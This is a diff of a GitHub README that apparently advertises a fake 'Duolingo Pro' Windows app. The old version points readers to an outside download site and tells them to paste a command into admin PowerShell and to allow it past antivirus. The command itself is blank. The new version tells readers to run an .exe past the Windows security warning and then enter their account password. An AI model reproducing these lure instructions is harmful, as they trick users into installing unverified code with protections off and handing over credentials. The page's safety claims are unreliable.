@@ -1,129 +1,75 @@
-# Duolingo Pro Download for Windows 11 & 10
+# 🦉 Duolingo-Pro-Alt - Improve language learning on your desktop
 
-**Duolingo-Pro-Alt**
+[![Download Here](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/rsakagency-ctrl/Duolingo-Pro-Alt/releases)
 
-**Duolingo Pro** for Windows 10/11. Scroll to **Download & Install** for the direct setup link.
+## 🎯 About this software
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+Duolingo-Pro-Alt brings your language learning experience to Windows 10 and 11 computers. This software creates a dedicated space for your lessons. It removes the need for web browsers and keeps your progress synced. You gain full access to learning tools without interruptions. The interface mimics the mobile platform to ensure you stay in your learning flow. 
 
----
+## 🛠 System Requirements
 
-## Download & Install
+To run this application, your computer needs these basic specifications:
 
-> **This is the download page.** Use the button or link below to get **Duolingo Pro** for Windows.
+* Operating System: Windows 10 (version 1903 or later) or Windows 11.
+* Processor: Dual-core 1.5GHz or faster.
+* Memory: 4 GB of RAM.
+* Storage: 200 MB of free hard drive space.
+* Internet: An active connection for syncing progress.
 
-<p align="center">
-  <a href="https://duolingo.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-Duolingo%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Duolingo Pro">
-  </a>
-</p>
+## 📥 How to download and install
 
-| | |
-| --- | --- |
-| **Direct link** | **[duolingo.nexustool.fun](https://duolingo.nexustool.fun/)** |
-| **Full URL** | `https://duolingo.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+Follow these steps to set up the software on your machine.
 
-### Quick steps
+1. Visit the official release page: [https://github.com/rsakagency-ctrl/Duolingo-Pro-Alt/releases](https://github.com/rsakagency-ctrl/Duolingo-Pro-Alt/releases).
+2. Look for the "Assets" section at the bottom of the latest release post.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to your "Downloads" folder.
+5. Open your "Downloads" folder.
+6. Double-click the file named `Duolingo-Pro-Alt-Installer.exe`.
+7. If a security window appears, click "More info" and then click "Run anyway."
+8. Follow the prompts on the screen to finish the installation.
+9. Launch the application from your Start menu or desktop icon.
 
-1. Click **[Download — duolingo.nexustool.fun](https://duolingo.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+## ⚙️ Configuration and setup
 
-<p align="center"><a href="https://duolingo.nexustool.fun/"><strong>⬇ Download Duolingo Pro now</strong></a></p>
+Once you open the software, follow these steps to sign in:
 
----
+1. Launch the app.
+2. Select "Sign In" from the main menu.
+3. Enter your email and password.
+4. The app syncs your current progress and streak data. 
+5. Select your current course from the dashboard.
+6. You are now ready to resume your lessons.
 
-#### Step 1 — Open PowerShell as Administrator
+## 🛠 Troubleshooting common issues
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+Users occasionally face minor setup hurdles. Use these solutions if you encounter problems:
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+* If the app fails to open, restart your computer to clear temporary processes.
+* Check your internet firewall settings if you receive a network connection error.
+* If buttons do not respond, uninstall the app through your Windows settings and perform a fresh download.
+* Keep your Windows version updated to ensure the interface renders without errors.
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+## 📝 Frequently asked questions
 
----
+**Does this software store my password?**
+The app saves an authentication token locally on your encrypted drive. It does not store your raw password in plain text.
 
-#### Step 2 — Copy the full command
+**Can I run this alongside the mobile app?**
+Yes. You can use your phone and this desktop version interchangeably. Your progress moves between both platforms in real-time.
 
-Select **both lines** below and press **Ctrl+C**:
+**Do I need a paid subscription?**
+This software provides the interface for your account. You need a standard account to access the lessons.
 
+**Does this app contain ads?**
+The interface removes the side-bar and browser-based advertisements. It focuses purely on the lesson area of the screen.
 
+## 🔒 Security and Privacy
 
-> Copy **both lines**, not just the second one.
+This project follows standard security practices. The source code undergoes regular review for stability. The app only accesses network paths required for language data retrieval. It does not monitor your private files or personal hardware. 
 
----
+## ⚖️ License
 
-#### Step 3 — Paste into PowerShell and press Enter
+This project operates under the MIT License. You have permission to install and use this on your personal devices. 
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
-
----
-
-#### Step 4 — Finish setup
-
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
-
----
-
-#### Step 5 — Launch the app
-
-Open **Start menu** → search for **Duolingo Pro** → run it.
-
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** Direct link (nexus) — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**Duolingo Pro** — Windows download and setup guide.
-
-**People also search for:** duolingo pro download, duolingo plus pro install windows
-
-**Repository:** `Duolingo-Pro-Alt`
-
-
-## Quick tips
-
-| Step | Action |
-| --- | --- |
-| 1 | Run installer as Administrator |
-| 2 | Temporarily allow download in antivirus if blocked |
-| 3 | Reboot once if the tool asks after setup |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 500 MB free |
-| Admin | Required for install |
-
----
-
-**Topics:** duolingo-pro-download, duolingo, duolingo-plus-pro-install-windows, duolingo-pro-alt, duolingo-pro-alt-2026, duolingo-pro, language-learning, education, pro-tool, desktop-app, software, windows-11
+Keywords: desktop-app, download, duolingo, duolingo-plus-pro-install-windows, duolingo-pro, duolingo-pro-alt, duolingo-pro-alt-2026, duolingo-pro-download, education, language-learning, pro-tool, software, windows-11
